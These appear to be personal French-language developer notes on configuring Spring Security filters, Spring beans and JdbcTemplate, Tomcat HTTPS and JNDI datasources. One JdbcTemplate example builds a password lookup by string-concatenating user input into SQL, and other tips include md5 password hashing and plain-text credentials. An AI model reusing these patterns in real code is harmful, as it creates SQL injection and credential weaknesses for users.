              <intercept-url pattern="/xxx/**" access="UN_ROLE" requires-channel="https ou http ou any"/> si user fait http et ici c marque https il est redirige en https. UN_ROLE est setté comme ça dans une classe qui étend UserDetailService :			Collection<SimpleGrantedAuthority> authorities = new HashSet<SimpleGrantedAuthority>(); authorities.add(new SimpleGrantedAuthority("UN_ROLE"));return new User(credential.getName(), credential.getRoleCode(), authorities);
 
              <intercept-url pattern="/**" access"UN_ROLE,ROLE_DEUXIEME"/>(ordre de ces balises important donc mettre de url plus specifique vers moins specif)
                                        attention UN_ROLE peut etre : ROLE_USER;ROLE_ANONYMOUS;;IS_AUTHENTICATED_ANONYMOUSLY(a une session jsessionid);IS_AUTHENTICATED_FULLY(a une session jsessionid authentifie) etc voir https://docs.spring.io/spring-security/site/docs/current/apidocs/org/springframework/security/access/vote/AuthenticatedVoter.html 
              a un niveau plus fin on peut dans les methodes des classes restreindre l'execution de ces methodes: pour ce faire *ùù* ci dessus
            <security:access-denied-handler error-page="/saml/web/metadata/login"/> // a chaque fois que tu vas sur un endroit interdit tu es redirige vers /saml/web/metadata/login
        </security:http>     Les filtres en fait s'executent à chaque fois meme si utilisateur est déjà connecté: a chaque requete
                      LINK(*55*)
                      CHANNEL_FILTER	ChannelProcessingFilter	http/intercept-url@requires-channel
                      SECURITY_CONTEXT_FILTER	SecurityContextPersistenceFilter	http (Non remplacable par mon filtre)
                      CONCURRENT_SESSION_FILTER	ConcurrentSessionFilter	session-management/concurrency-control
                      LOGOUT_FILTER	LogoutFilter	http/logout
                      X509_FILTER	X509AuthenticationFilter	http/x509
                      PRE_AUTH_FILTER	AstractPreAuthenticatedProcessingFilter Subclasses	N/A
                      CAS_FILTER	CasAuthenticationFilter	N/A
                      FORM_LOGIN_FILTER	UsernamePasswordAuthenticationFilter	http/form-login
                      BASIC_AUTH_FILTER	BasicAuthenticationFilter	http/http-basic
                      SERVLET_API_SUPPORT_FILTER	SecurityContextHolderAwareRequestFilter	http/@servlet-api-provision
                      REMEMBER_ME_FILTER	RememberMeAuthenticationFilter	http/remember-me
                      ANONYMOUS_FILTER	AnonymousAuthenticationFilter	http/anonymous
                      SESSION_MANAGEMENT_FILTER	SessionManagementFilter	session-management
                      EXCEPTION_TRANSLATION_FILTER	ExceptionTranslationFilter	http  (Non remplacable par mon filtre)
                      FILTER_SECURITY_INTERCEPTOR	FilterSecurityInterceptor	http (Non remplacable par mon filtre) mais je peux redefinir ce bean id="filterSecurityInterceptor" class="org.springframework.security.web.access.intercept.FilterSecurityInterceptor" et lui redefinir d'autres proprietes
                      SWITCH_USER_FILTER	SwitchUserFilter	N/A

        maintenant pour gerer les utilisateurs et leurs roles : 
        <security:authentication-manager alias="sonNomAppeleAilleurs(enGeneralUnFiltre)Par ref=''"> // c'est lui qui traite la requete request quand l'utilisateur vient de tenter de s'authentifier depuis le EntryPoint.
                contient le providermanager qui a plusieurs authenticationProvider qui s'enchainent les uns a la suite des autres:
                      <security:authentication-provider>
                                  possible definir direct des users et leurs roles ici avec <user-service> ici possible encrypter password <password-encoder>
                      </security:authentication-provider>
                      <security:authentication-provider user-service-ref="monBeanUserServicePerso"> un autre: chacun est consulte à son tour. Ils sont tous dans le providermanager qui est dans le authenticationmanager
                                                    ou ref="monBeanAuthenticationProvider"> implemente AuthenticationProvider
                      </security:authentication-provider>
        </security:authentication-manager>
      <bean:bean id="monBeanUserServicePerso" class="..springframework...JdbcDaoImpl"> les users sont en base
          <beans:property name="dataSource" ref="dataSource"/>
      </bean:bean>
      Et maintenant mon filtre custo appeler l'authentication-manager defini ci-dessus
        <bean id="monBeanCustomFiltre" class="xxx">
          <property name="authenticationManager" ref="sonNomAppeleAilleurs(enGeneralUnFiltre)">
          facultatif: <property name="accessDecisionManager" ref="monBeanAccessDecisionManager"/> 
        </bean>
      
      spring security: JAVA STYLE: depuis spring3
      Securiser mes services par aspectj, AOP pour les methodes ET les filtres pour toute la request requete :(l'objet AccessDcisionManager gère ça)
      AVANT:  
          @Secured("MON_RIGHT") ou @Secured("MON_ROLE") // ce dernier est deconseille: on devrait mettre que des rights dans la logique.
           public void maMethode()...{...
          faudra mettre dans conf spring 
          	<!--  pour securiser par aspectj A remettre en disabled pour que les junit fonctionnent sans pb de securite-->
              <global-method-security secured-annotations="enabled"/>
      APRES (c mieux)
          @PreAuthorize(hasRole('MON_RIGHT_PAS_MON_ROLE_CAR_RIGHT_BONNE_PRATIQUE') and #monParam.maProprieteDuBean==authentication.name) // and : permet aussi de valider si j'ai le droit en tant que user de rentrer dans la methode
              public void maMethode(Bean monParam)...{...
              faudra mettre dans conf spring 
              	<!--  pour securiser par aspectj A remettre en disabled pour que les junit fonctionnent sans pb de securite-->
                  <global-method-security pre-post-annotations="enabled"/>
      si message probleme csrf mettre dans mes formulaires : voir LINKc.s.r.f 
                <form class="form-horizontal" id="search-form" action="${pageContext.request.contextPath}/getresults?${_csrf.parameterName}=${_csrf.token}" method="POST">
                ou 
                <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
      
    quel utilisateur est connecte? ne plus utiliser HttpSession. Pour recuperer la session faire
        Object principal = SecurityContextHolder.getContext().getAuthentication().getPrincipal(); // getAuthentication renvoit null pointer exception si personne connecte
        if (principal instanceof UserDeatails){String username=((UserDetails)principal).getUsername();} linkinstanceof
        else{String username = principal.toString();}
        dans jsp:${pageContext.request.remoteUser}
        Bonne pratique: a mettre dans un bean spring que je cree (avec son interface et l'injecter)
     Tester les filtres de securite: tests : test : 
      @Autowired
      @Qualifier("nom")//facultatif // correspond je crois au name du bean
      private FilterChainProxy springSecurityFilterChain;
      puis dans la methode de test:
      mockMvc=MockMvcBuilders.webApplicationContextSetupOuwebAppContextSetup(this.wac).addFilter(this.springSecurityFilterChain).build(); voir LINKmockmvc 
      et voir plus bas les tests d'urls avec users et roles
  pour connaitre le role d'un utilisateur dans mon controlleur web en java
                if(request.isUserInRole(Constants.ROLE_GESTFORM))
                sinon utiliser SecurityContextHolderAwareRequestWrapper si jene suis pas dans un controlleur. jamais fait encore. 
Spring : JAVA STYLE
  charger un fichier xml de configuration
      @ImportResource({"classpath*:context.xml"})// au  dessus d'une autre classe de config
  si au demarrage j'ai un AbstractMethodError: 
        bien lire les logs: c un pb de conflit de classe: virer une des librairies
  si je veux faire un post construct mais ma classe n'a pas l'anotation bean (parce que c'est un parent de bean) alors
                implementer InitializingBean  et la methode 
                	public void afterPropertiesSet() throws Exception { // cette meth s'execute automatiquement qd bean fini init
                 puis par exemple : jdbcTemplate = new NamedParameterJdbcTemplate(dataSource); // Toujours utiliser celui la car voir ci-dessous. Avec son utilisation si pas de ligne trouvee il renvoit EmptyResultDataAccessException: meilleur solution catcher et traiter cela
                                                                   @Autowired
                                                                  	JdbcTemplate jdbcTemplate;
                                                        avec namedParameterJdbcTemplate.getJdbcOperations().methodes de jdbctemplate disponibles ici! :-)
                                                        exemple pour faire un update avec namedjdbctemplate: int update = jdbcTemplate.getJdbcOperations().update((String) properties.get("sqlUpdatePassword"), new Object[] {password, userid, oldpassword});
                }                                       exemple pour faire un select avec namedparameterjdbctemplate : List<UserBean> res = (List<UserBean>) jdbcTemplate.getJdbcOperations().query("select CDPASS from UC10 where CDUTIL ='"+lognidUpperCase+"'", new UserBeanRowMapper()); // pas réussi en faisant soit ? soit :xxx procédure stockee
        Explicitly name your component [@ComponentGENERIQUEEVITERDUTILISERUtiliser@Named(“beanName”)] ou mes configs  : @Configuration("nomdemaconfig")
                                         class MonComponentBeanName                class MaConfigConfName VOIR conf ci dessous.
        on peut ensuite dans une classe les appeller avec @Resource(name="beanName ou nomdemaconfig" ou rien mettre c comme @Autowire) UneIntefrace maSource;
          Eviter ‘@Qualifier’ annotations unless you want to create a list of similar beans. 
Conf java                                        
         dans ma conf java annotee @Configuration("facultatif_nomdemaconfigvoircidessus") // cette classe est alors une classe de conf qui declare les beans 
          @Import(UneAutreClassDeConfig.class)
          @ComponentScan(basePackages = {"my.package.service"}) // PasPourLesTests. cherches les annot sous ce package pour creer les beans Scan specific packages for components (voir equiv en xml)
            proprietes:
          @PropertySource("classpath:/my.properties") // Mettre au dessus classe de conf.@Configuration() Pour toutes les autres classes qui utilisent @Value("${keyDansFichierPropriete:valeurParDefautFacultatif}") il va chercher la valeur des {$toto.toto} dans ce fichier de propriete sous resources
                          "file:/C:/..."                                                                                                                       exemples Spring el SPEL: 
                                                                                                                                                                              @Value("#{'${ws.authorized.remoteIp}'.split(',')}") converti un string en listeSpring SPEL expressions
                                                                                                                                                                              @Value("#{systemProperties['os.arch'].equals('x86') ? winDataSource : unixDataSource}")
                                                                                                                                                                              private List<String> authorizedIp;
                   recuperer des proprietes:                          
              mais attention besoin creer been dans la conf comme ci dessous pour que ça marche: 
              @Bean
                  public static PropertySourcesPlaceholderConfigurer propertiesResolver() {(org.springframework.context.support.PropertySourcesPlaceholderConfigurer va chercher les props dans web.xml context-param NON c faux)
                      return new PropertySourcesPlaceholderConfigurer();
                  }
                  si je veux encrypter des proprietes dans les fichiers properties avec spring il faut sousclasser la classe PropertyPlacementConfigurer  et dans ma classe ajouter la methode convertPropertyValue
                                                                                                        protected String convertPropertyValue(String strVal) {
                                                                                                            //if strVal starts with “!!” then return EncryptUtil.decrypt(strVal)
                                                                                                            // else return strVal
                      pour qu'il aille chercher aussi les proprietes systèmes systemes: systemPropertiesMode =1 ou 2... voir la classe.
               autre methode avant spring3.1 : proprietes externes externalisee
                     PropertyPlaceholderConfigurer cfg = new PropertyPlaceholderConfigurer(); voir aussi PropertySourcesPlaceholderConfigurer
            				org.springframework.core.io.Resource[] resources = new FileSystemResource[] 
                    {
            						new FileSystemResource(confDir + File.separator + "bms_ged.properties"),
            						new FileSystemResource(confDir + File.separator + "openhr.properties")
            				};
            				cfg.setLocations(resources);				            				
            				ConfigurableApplicationContext context = new ClassPathXmlApplicationContext("maconfig.xml");
conditionnel:				context.addBeanFactoryPostProcessor(cfg); // modifie mon contexte à la volee au runtime des que ensuite je fais 
            				context.refresh();                        // ca! recharge reinitialise rafraichit les beans
            				context.getBean(); recuperation bean possible.
            	
      pour initialiser quelquechose avant que la configuration s'execute:(dans la classe configuration)
                  @Bean
                public String init()
                {
                    System.out.print("INIT!");
                 System.getProperties().put("socksProxyPort", "1080"); // recupère prop de la jvm voir LINKù*ù
                 System.getProperties().put("socksProxyHost", "172.26.80.141");
                    return null;
                }
                    @Bean
                    @DependsOn("init")
                    public IHRSession getIHRSession() throws Exception {
                        HRApplication.configureLogs("classes/log4j-openhr.properties");
                        return getHRSessionFactory().createSession(getMapConfiguration());
                    }               
      Creation de beans:
              @Bean
              public ClassA methRenvoitClassA() >>>>>>>>>>>equivalent de  public ClassA classA(ClasseB b)  ca c mieux car si ClassA et B sont pas dans la meme classe de conf, ça compile.
                                                          {                                                 {
                                                            ClassA a  = new ClassA();                           ClassA a  = new ClassA();
                                                            a.unSetter(classB());                               a.unSetter(b);
                                                            return a;                                           return a;   // on retourne toujours une classe dans la conf des beans de spring et c'est toujours execute au demarrage
                                                          }                                                  }
                                                          public ClassB methRenvoitClassB() 
                                                          {....                                                                                                    ""
  Recup un bean si mon fichier de conf est Java
      AnnotationConfigApplicationContext tata = new AnnotationConfigApplicationContext(MaClasseDeConfig.class, UneAutreConfigMaisBof**.class); // attention il regenere l'arborescence de beans je crois
      IUneClasse = tata.getBean(UneClasse.class);
AILLEURS : injecter mes beans par constructeur
                                            IplaceDao placeDao;
                                            (...)
                                            @Autowired // peut etre mis sur un constructeur, un champ, un setter ou un configmethod(?)
                                                        l'argument est injecte(provient d'un bean declare ailleurs dans la conf)
                                          public MonConstructeur(IplaceDao placeDao, IpriceDao priceDao, IresultDao resultDao, IagencyDao agencyDao, IdepartureDao departureDao, ItransitDao transitDao, IagencyTypeDao agencyTypeDao, @Qualifier("commentAgencyDao") IcommentDao agencyCommentDao,     @Qualifier("commentDepartureDao")IcommentDao departuresCommentDao, IWelcomeController welcomeController, IuserDao userDao) {
                                              this.placeDao = placeDao;
                                              this.priceDao = priceDao;
                                              this.resultDao = resultDao;
                                              this.agencyDao = agencyDao;
                                              this.departureDao = departureDao;
                                              this.transitDao = transitDao;
                                              this.agencyTypeDao = agencyTypeDao;
                                              this.agencyCommentDao = agencyCommentDao;
                                              this.departuresCommentDao = departuresCommentDao;
                                              this.userDao = userDao;
                                              this.welcomeController= welcomeController;
                                          }
      conditionnels:  
                            @Bean
                            public MyBean myBean() {
                                MyBean myBean = new MyBean();
                                if (unecondition) {
                                    myBean.setDependency(dependencyX());
                                } else {
                                    myBean.setDependency(dependencyY());
                                }
                                return myBean;
                            }
                            on peut aussi activer un profile en lancant l'application avec : --spring.profiles.active=unevaleur,unautreprofile ou -Dspring.profiles.active=infosFromURL ou AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(); context.getEnvironment().setActiveProfiles("Linux");
                      @Profile("unevaleur") // conditionnel alors cette classe ne s'injecte ailleurs que si dans une application.properties : spring.profiles.active=unevaleur,uneautrevaleur ou bien en mettant @ActiveProfiles dans la classe qui execute
                      @Conditional à mettre dans une methode @Bean de la @Configuration: @Conditional(UneDeMesClasseImplementantConditional.class)
                                                      UneDeMesClasseImplementantConditional implements Condition
                                                      {@Override
                                                      public boolean matches()
                                                      {ma condition}
                      @ConditionalOnClass({UneClassePeutEtrePresenteDansLeClasspath.class,UneAutre.class}) conditionnel: cette classe s'injecte si les deux classes specifiees existent dans le classpath
                      @ConditionalOnMissingBean(UneClasseQuiPeutEtreEstInstancieeDansUnBean.class) conditionel : Ne cree les beans ci dessous que si un bean de ce type n'existe pas dejà comme ca:@Bean UneClasseQuiPeutEtreEstInstancieeDansUnBean lala(){return null; }
                      @Configuration ou @ComponentGENERIQUEEVITERDUTILISERUtiliser@Named   
                      UneClasse 

        spring et mongodb :
                    une classe @Configuration doit contenir aussi l'annotation :
                                @EnableMongoRepositories(basePackages="package.vers.le.repository.mongodb")
                                
                    et sous package.vers.le.repository.mongodb
                        avoir une classe: 
                            @Repository
                            public interface MongoDBRepository extends MongoRepository<MmcUser, String>
                            {
                            }                                           
        pour faire des requetes jdbc : le resultat des requtes sql se map avec objets simples java (ne fait pas de mapping objet complexe)
            si j'ai l'erreur IncorrectResultSetColumnCountException : je ne peux pas mappser avec un objet à moi avec car queryForList ne permet pas de faire ce mapping.  
              jdbcTemplate.queryForList(sql, leschampssql, CetteClasseDoitEtreDeTypeSimpleAvecQu'unChampGenrejava.sql.Timestamp.class);
            si j'ai erreur  given 1 parameters but expected 0  ou si j'ai Incorrect result size: expected 1, actual 0 alors peutetre
                  remplacer ? par =:nudoss
                        List<ZY5B> zy5B = getJdbcTemplate().query(sql,new BeanPropertyRowMapper(ZY5B.class));
                                          pour logguer les requetes de jdbctemplate : log4j.logger.org.springframework.jdbc.core = DEBUG, consoleappender, fileappender
                    champs avec ?:
                        String sql = "select IDCP00...d zoep.nudoss=?";
                				int custId=2;
                				1ligne
	                      JobBean jobBean = (JobBean) getJdbcTemplate().queryForObject(sql, new Object[] { custId }, String.class);
	                      PlusieursLignes LA METHODE! THE BEST
                              public List<ZY5B> getAllByField(String field, Integer value) 
                              {
                                String sql ="select NUDO,FLCANC from ZY5B where nudoss =:nudoss";
                                Map<String,Object> leschamps=new HashMap<String,Object>();
                                leschamps.put(field,value);
                                List<ZY5B> zy5B = jdbcTemplate.query(sql, leschamps, new BeanPropertyRowMapper<ZY5B>(ZY5B.class));
                                return zy5B;
                            }
                        champs avec nom:
                            Map<String,Object> leschamps=new HashMap<String,Object>();
                            leschamps.put("champ1","valeurblabla");
                            etc...
                            SqlParameterSource leschampssql = new MapSqlParameterSource(leschamps);
                            long l = jdbcTemplate.queryForLong("select...:champ1...",leschampssql);
                        avec un rowmapper c simple : ONE OF THE BEST! (parrait que maintenant c asbeen.)
                              public List<UserBean> getUsers(String loginId)
                              {
                                List users = this.jdbcTemplate.query(this.sql, new Object[] { loginId }, new UserBeanRowMapper(null));
                                return users;
                              }
                              private static final class UserBeanRowMapper implements RowMapper {
                                public Object mapRow(ResultSet rs, int rowNum) throws SQLException {
                                  UserBean user = new UserBean();
                                  user.setLOGNID(rs.getString("lognid"));
                                  user.setNMLOTU(rs.getString("nmlotu"));
                                  user.setPASWRD(rs.getString("paswrd"));
                                  return user;
                                }
                              }    
                            
                        voir ailleurs :@RepositoryRestResource pour ne pas avoir a saisir les requetes
        
 faire du https :sur tomcat :
                    <Connector protocol="org.apache.coyote.http11.Http11Protocol" port="8843" maxThreads="200"  scheme="https" secure="true" SSLEnabled="true"
                          ciphers="TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA_TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA256,TLS_RSA_WITH_AES                      keystoreFile="${catalina.base}/conf/yyyy.jks" keystorePass="zzzz" clientAuth="false" sslProtocol="TLS"/>
                     <connector sert à definir le port http et https de tomcat. je ne peux pas mettre deux connector pour le meme port. sinon bind exception                         

                  server.xml ne peut pas faire du http sur port 80 mais que sur 8080 alors faire 
                        voir iptables                                                                                    
                    pour autoriser que certaines machines à acceder au tomcat, mettre une valve dans server.xml
                      <Engine name="Catalina" defaultHos="localhost">....<Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="10\.123\.44\.|10\.49\.393\.44"/>
                       ou bien mettre un filtre dans web.xml du tomcat ou meme de l'appli?      
                dans Tomcat context.xml, LINK39210                                     pour faire les tests : mocker un jndi en conf : Pour declarer une data base de donnée pour requetes sql
                        <Resource                                                      <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"> 
                               name="jdbc/sqliteDS"                                      <bean id="dataSource" class="org.apache.tomcat.dbcp.dbcp.BasicDataSource ou org.springframework.jdbc.datasource.DriverManagerDatasource" destroy-method="close"> (cette classe à pour interface javax.sql.Datasource et c ca qu'on utilise dans le code) ou <bean id="dataSourceRepository" class="org.springframework.jdbc.datasource.DriverManagerDataSource">  
                               auth="Container"                                            <property name="driverClassName" value="oracle.jdbc.driver.OracleDriver" />                      
                               type="javax.sql.DataSource"                                 <property name="url" value="jdbc:oracle:thin:@server:port:instance" />                           
                               maxActive="4"                                               <property name="username" value="user" />                                                          
                               maxIdle="2"                                                 <property name="password" value="pwd" />                                                       
                               username="x"                                              </bean>                                                                                          
                               maxWait="5000"                                          </beans>                                                                                           
                               driverClassName="org.sqlite.JDBC"                       
                               password="x"                                            
                               url="jdbc:sqlite:/home/xxx/db.sqlite"/>
                        <Resource name="url/GrantApiJEESS3" auth="Container" type="java.net.URL" factory="com.calyon.tomcat.UrlFactory" url="file:///C:/GrantClientJEESS3Prototype/src/main/resources/grant.properties" /> // autre exemple pour que le jndi pointe vers un fichier .properties que j'ecris comme je veux. Apres dans web.xml j'ai un resource-env-ref (voir web.xml LINK39210)                        
                        </Context>                                                     
                                                                                            <!-- ou plutot utiliser le jndi du serveur -->
                                                                                                <bean id="galleryDatasource" class="org.springframework.jndi.JndiObjectFactoryBean">
                                                                                                  <property name="jndiName" value="java:comp/env/jdbc/gallery"/>
                                                                                                </bean>
                                                                                                <!-- ou alors en plus court avec le namespace jee: -->
                                                                                                    <jee:jndi-lookup id="galleryDatasource" jndi-name="java:comp/env/jdbc/gallery"/>    
                   dans web.xml                   
                        <resource-ref>
                            <description>sqlite DataSource</description>
                            <res-ref-name>jdbc/sqliteDS</res-ref-name>
                            <res-type>javax.sql.DataSource</res-type>
                            <res-auth>Container</res-auth>
                        </resource-ref>
                  dans data-context.xml:                                                                                  
                        <bean id="dataSource" class="org.springframework.jndi.JndiObjectFactoryBean">                     
                            <property name="jndiName" value="java:/comp/env/jdbc/sqliteDS" />                             
                        </bean>     
                  dans catalina/localhost/monapplication.xml se trouve la definition du jndi:
                      <Resource name="jdbc/jetspeed" auth="Container"
                        factory="org.apache.commons.dbcp.BasicDataSourceFactory"
                        type="javax.sql.DataSource" username="JETSPEED" password="JETSPEED"
                        driverClassName="oracle.jdbc.driver.OracleDriver" url="jdbc:oracle:thin:@localhost:1521:HRBAC92"
                        maxActive="100" maxIdle="30" maxWait="10000" validationQuery="SELECT CLIENT_ID FROM CLIENT"/>                                                                                      
                                                                                      dans mon test : tests :
                                                                                       @BeforeClass // recuperer un bean
                                                                                          public static void initJndi() throws Exception {
                                                                                              ApplicationContext applicationContext = new ClassPathXmlApplicationContext("jndi.xml");
                                                                                              SimpleNamingContextBuilder builder = new SimpleNamingContextBuilder();
                                                                                              builder.bind("java:comp/env/jdbc/foo", applicationContext.getBean("dataSource"));
                                                                                              builder.activate();
                                                                                          }
                       faire de l'injection par constructeur
                                            IplaceDao placeDao;
                                            (...)
                                            @Autowired
                                          public MonConstructeur(IplaceDao placeDao, IpriceDao priceDao, IresultDao resultDao, IagencyDao agencyDao, IdepartureDao departureDao, ItransitDao transitDao, IagencyTypeDao agencyTypeDao, @Qualifier("commentAgencyDao") IcommentDao agencyCommentDao,     @Qualifier("commentDepartureDao")IcommentDao departuresCommentDao, IWelcomeController welcomeController, IuserDao userDao) {
                                              this.placeDao = placeDao;
                                              this.priceDao = priceDao;
                                              this.resultDao = resultDao;
                                              this.agencyDao = agencyDao;
                                              this.departureDao = departureDao;
                                              this.transitDao = transitDao;
                                              this.agencyTypeDao = agencyTypeDao;
                                              this.agencyCommentDao = agencyCommentDao;
                                              this.departuresCommentDao = departuresCommentDao;
                                              this.userDao = userDao;
                                              this.welcomeController= welcomeController;
                                          }   
    pour crypter les password dans tomcat-user.xml:
            First edit the REALM in the $CATALINA_HOME/conf/server.xml. Add the attribute of digest="HASH_TYPE" The values for HASH_TYPE can be sha, md5 or md2.
            Execute the following to generate the HASH of the password:
            $CATALINE_HOME/bin/digest.sh -a HASH_TYPE PASSWORD
            Replace the password for the user in question in the $CATALINA_HOME/conf/tomcat_users.xml file
            Restart Tomcat                                                                                          
    h2 : embedded database:
                    dans la config xml:
                          <jdbc:embedded-database id="dataSourceRepository" type="H2">
                            <jdbc:script location="${ws.schema.script}" /> 
                            <jdbc:script location="${ws.data.source.init}" />
                          </jdbc:embedded-database>
                          dans le fichier pointe par ${ws.schema.script} pour que to_date existe mettre :
                                            -- TO_DATE
                                            drop ALIAS if exists TO_DATE;
                                            CREATE ALIAS TO_DATE as '
                                            import java.text.*;
                                            @CODE
                                            java.util.Date toDate(String dateTime, String dateFormat) throws Exception {
                                                if (dateFormat.contains("MON")) {
                                                    dateFormat = dateFormat.replace("MON", "MMM");
                                                }
                                                if (dateFormat.contains("Y")) {
                                                    dateFormat = dateFormat.replaceAll("Y", "y");
                                                }
                                                if (dateFormat.contains("D")) {
                                                    dateFormat = dateFormat.replaceAll("D", "d");
                                                }
                                                if (dateFormat.contains("HH")) {
                                                    dateFormat = dateFormat.replaceAll("HH", "hh");
                                                }
                                                if (dateFormat.contains("hh24")) {
                                                    dateFormat = dateFormat.replaceAll("hh24", "hh");
                                                }
                                                if (dateFormat.contains("MI") || dateFormat.contains("mi")) {
                                                    dateFormat = dateFormat.replaceAll("MI", "mi").replaceAll("mi", "mm");
                                                }
                                                if (dateFormat.contains("SS")) {
                                                    dateFormat = dateFormat.replaceAll("SS", "ss");
                                                }
                                                return new SimpleDateFormat(dateFormat).parse(dateTime);
                                            }
                                            ';

                          
                        
          
                             
Spring : XML STYLE                                                                      
      DelegatingFilterProxy :                                                           
          web.xml :
            <filter>
        		<filter-name>samlResponseFilter</filter-name>
        		<filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
        	</filter> permet d'utiliser la force de spring pour injecter dans mon filter
        	spring-context.xml:
        	 <bean id="samlResponseFilter" class="com.hraccess.hraspace.sso.saml.filter.SAMLAuthResponseFilter" parent="abstractSamlFilter" init-method="initFilter">
                		<property name="parser" ref="parserPool" />
                		<property name="uriComparator" ref="uriComparator" />
                		<property name="principalExtractor" ref="principalExtractor" />
            </bean>
     En plus: sorte de pluggins :
        Rest webservices
        Dozer pour serialiser pour Rest = beanUtils ameliore
        http://www.codesenior.com/en/tutorial/Spring-ContextLoaderListener-And-DispatcherServlet-Concepts
  =CoreContainer = beanFactory: permet IOC, AOP I18N etc et...
                      V
                    ApplicationContext
                      V
                    WebApplicationContext. // possede en plus de ApplicationContext la methode "getServletContext"
    dans web.xml ecrire : charger une configuration spring :
          <!-- ci dessous c le AppliCationcontext root de TOUTE l'appli qui peut contenir des fils:1par sevlet(voir cidessous) -->
            	     <!-- tous les listener ci-dessous qui implementent "ServletContextListnener" sont notifies quand une servletcontext est creee au demarrage et ce listener cherche le contextConfigLocation (voir ci dessous)-->
              <listener>
                 <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
                                ou
                                  org.springframework.web.context.request.RequestContextListener //permet de requperer le httprequest dans les filtres de securite security spring ou n'importe où comme ça : 	@Autowired private HttpServletRequest
	                                ou 
                                 ContextLoaderServlet (pour les servlets  version <2.3)
            </listener>
          <context-param>
      		<param-name>contextConfigLocation</param-name>
      		<param-value>
                 /WEB-INF/spring/applicationcontext.xml // je crois qu'il vaut mieux tout mettre dans le classpath sinon il ne trouve pas les beans selon serveur (faire co juste ci dessous)
      					classpath*:/org/springframework/batch/admin/web/resources/webapp-config.xml
			           classpath*:/META-INF/spring/*-ctx.xml
			           classpath*:/META-INF/spring/job/*-context.xml
			</param-value>
    </context-param>
     <servlet>
                      <servlet-name>monDispatcher</servlet-name>    <!-- c'est mon frontcontroller. toutes les urls du navigateur qui matchent LINKurldispatcherservlet vont être traitées les beans qui sont déclarées dans le LINKxmlconfigdispatcherservlet
                      <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
                      <!-- instanciation des beans de cette conf appartenant à CETTE servlet par le contextListener qui a vu cette servlet se creer: donc chaque servlet a ses bean propres et a accès aussi aux beans de l'applicationContext. -->
                      <init-param> block facultatif. Si je ne le met pas, par défaut il va chercher  le xml WEB-INF/monDispatcher-servlet.xml <--LINKxmlconfigdispatcherservlet
                        <param-name>contextConfigLocation</param-name>
                        <param-value>classpath:monDispatcher-servlet.xml</param-value> <-- LINKxmlconfigdispatcherservlet.
                        ou
                        <param-value>/WEB-INF/spring/monDispatcher-servlet.xml</param-value><!-- LINKxmlconfigdispatcherservlet les beans de ce fichiers peuvent faire reference aux beans du ApplicationContext mais pas l'inverse-->
                                                    ce fichier contiendrait:
                                                                                    <?xml version="1.0" encoding="UTF-8"?>
                                                                                    <beans xmlns="http://www.springframework.org/schema/beans"
                                                                                           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                                                                                           xmlns:context="http://www.springframework.org/schema/context"
                                                                                           xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">
                                                                                    
                                                                                        <context:component-scan base-package="com.hraspace.controller"/>
                                                                                        <mvc:annotation-driven /> // Enables the Spring MVC @Controller programming model
                                                                                        <mvc:resources mapping="/resources/**" location="/, classpath:/META-INF/web-resources/" /> //Handles HTTP GET requests for /resources/** by efficiently serving up static resources in the ${webappRoot}/resources directory
                                                                                        <mvc:resources mapping="/images/**" location="/images/" /> 
                                                                                            <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"> //Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory
                                                                                            <property name="prefix" value="/WEB-INF/jsp/"/>
                                                                                            <property name="suffix" value=".jsp"/>
                                                                                        </bean>
                                                                                    
                                                                                    </beans>
                      </init-param>
                      <load-on-startup>1</load-on-startup>
            </servlet> 
          <servlet-mapping>
                  <servlet-name>monDispatcher</servlet-name> est la servlet ** ci dessus On peut l'appeler par ServletContext context = request.getServletContext().getContext("/customloginform"); puis context.getRequestDispatcher("/login").forward(request, response); dirige vers l'url du controlleur "/customloginform/login" concatenation des deux attention. LINKçç("'"' 
                  <url-pattern>/art/*</url-pattern> <!-- comme ca si url = tototo/art/xxx ça passe par ce dispatcher et si url=/art/blibli ça va chercher @RequestMapping(value = "/blibli"). ou bien tout simplement "/" -->
                  ou
                  <url-pattern>*.html</url-pattern> <!-- et la un controlleur /toto sera appele en mettant /toto.html avec extension .html dans le navigateur -->
          </servlet-mapping>
                DelegatingFilterProxy : filtre
            <filter>
          		<filter-name>samlResponseFilter</filter-name>
          		<filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
        	</filter> permet d'utiliser de dire que mon filtre c'est un bean dont l'id est samlResponseFilter et sa classe doit implementer Filter
        </web-app>
  spring-context.xml:
      Fonctionnement des XSD :
      <?xml version="1.0" encoding="UTF-8"?>
          <beans xmlns="http://www.springframework.org/schema/beans" // les balises <bean> n'ont pas besoin de prefixe et sont associees à l'identifiant unique http://www.springframework.org/schema/beans 
          	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" // Genre d'entete.
          	xmlns:util="http://www.springframework.org/schema/util" //Le prefixe "util" est associe a l'identifiant unique http://www.springframework.org/schema/util 
          	xmlns:context="http://www.springframework.org/schema/context" // pareil
          	xmlns:mvc="http://www.springframework.org/schema/mvc" // pareil
          	xsi:schemaLocation="
          		 http://www.springframework.org/schema/beans // l'identifiant unique declare ci dessus et repris ici est associe au xsd:
          		 http://www.springframework.org/schema/beans/spring-beans.xsd // que voici qu'on trouve declare sous une librairie(nom peut etre n'imp! :-((( ) sous lejar/META-INF/spring.schemas
          		http://www.springframework.org/schema/util // cet identifiant est relie à...  
